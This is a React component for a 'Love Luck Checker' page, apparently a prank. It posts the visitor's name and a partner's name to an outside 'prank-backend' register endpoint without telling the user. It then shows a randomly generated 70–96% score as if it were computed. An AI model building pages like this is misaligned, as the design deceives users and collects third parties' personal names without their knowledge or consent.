import React, { useState } from 'react';
import { motion } from 'framer-motion';
import axios from 'axios';

const LoveLuckChecker = () => {
  const [formData, setFormData] = useState({
    username: '',
    partnerName: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState(null);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setResult(null);

    try {
      // Sending form data to the API
      await axios.post('https://prank-backend.onrender.com/api/users/register', formData);

      // Simulate processing delay
      setTimeout(() => {
        // Generate random love luck percentage between 70% and 96%
        const randomPercentage = Math.floor(Math.random() * 27) + 70;
        setIsLoading(false);
        setResult(randomPercentage);
      }, 2000);
    } catch (error) {
      console.error('Error submitting form:', error);
      setIsLoading(false);
      setResult('Error submitting form. Please try again.');
    }
  };

  return (
    <>
      <header className="bg-black text-white py-4 shadow-md">
        <div className="container mx-auto flex items-center justify-between">
          <motion.div
            initial={{ opacity: 0, x: -50 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.5 }}
            className="flex items-center space-x-4"
          >
            {/* <img src="/logo.png" alt="Love Luck Logo" className="h-8 w-auto" /> */}
            <h1 className="text-xl font-bold">Love Luck Checker</h1>
          </motion.div>
        </div>
      </header>

      <main className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-black to-red-900 p-4">
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.8 }}
          className="bg-gradient-to-br from-black via-gray-800 to-red-700 rounded-3xl shadow-2xl p-8 sm:p-12 max-w-lg w-full"
        >
          <h1 className="text-4xl sm:text-6xl font-extrabold text-red-300 text-center mb-6 sm:mb-8 relative">
            Check Your Love Luck
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{ duration: 1, delay: 0.5 }}
              className="absolute inset-0 -z-10"
              style={{ background: 'radial-gradient(circle, rgba(255,0,0,0.1), rgba(255,0,0,0))' }}
            />
          </h1>
          
          <motion.div
            initial={{ y: -20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ duration: 0.5, delay: 0.2 }}
          >
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label htmlFor="username" className="block text-lg sm:text-xl font-medium text-gray-200">
                  Your Name
                </label>
                <input
                  type="text"
                  id="username"
                  name="username"
                  value={formData.username}
                  onChange={handleChange}
                  className="w-full px-4 py-2 sm:px-5 sm:py-3 bg-gray-900 text-gray-200 border border-gray-700 rounded-lg shadow-lg focus:ring-2 focus:ring-red-500 focus:outline-none"
                  required
                />
              </div>

              <div>
                <label htmlFor="partnerName" className="block text-lg sm:text-xl font-medium text-gray-200">
                  Partner's Name
                </label>
                <input
                  type="text"
                  id="partnerName"
                  name="partnerName"
                  value={formData.partnerName}
                  onChange={handleChange}
                  className="w-full px-4 py-2 sm:px-5 sm:py-3 bg-gray-900 text-gray-200 border border-gray-700 rounded-lg shadow-lg focus:ring-2 focus:ring-red-500 focus:outline-none"
                  required
                />
              </div>

              <motion.button
                whileHover={{ scale: 1.05, backgroundColor: '#ff4d4d' }}
                whileTap={{ scale: 0.95 }}
                type="submit"
                className="w-full bg-gradient-to-r from-red-500 to-pink-500 text-white py-3 rounded-lg shadow-lg hover:bg-gradient-to-r hover:from-red-600 hover:to-pink-600 transition-all font-semibold"
              >
                Submit
              </motion.button>
            </form>
          </motion.div>

          {isLoading && (
            <motion.div
              className="mt-6 text-center text-lg sm:text-xl text-red-400"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              Processing your love luck...
              <div className="loader mt-4 mx-auto w-12 h-12 border-t-4 border-red-400 border-solid rounded-full border-opacity-50 animate-spin"></div>
            </motion.div>
          )}

          {result && !isLoading && (
            <motion.div
              className="mt-8 text-center text-3xl sm:text-4xl font-bold text-yellow-300"
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{ duration: 0.8 }}
            >
              💖 Your Love Luck is: {result}% 💖
            </motion.div>
          )}
        </motion.div>
      </main>

      <footer className="bg-black text-white py-4 ">
        <div className="container mx-auto text-center">
          <motion.p
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            &copy; {new Date().getFullYear()} Love Luck Checker. All rights reserved.
          </motion.p>
        </div>
      </footer>
    </>
  );
};

export default LoveLuckChecker;
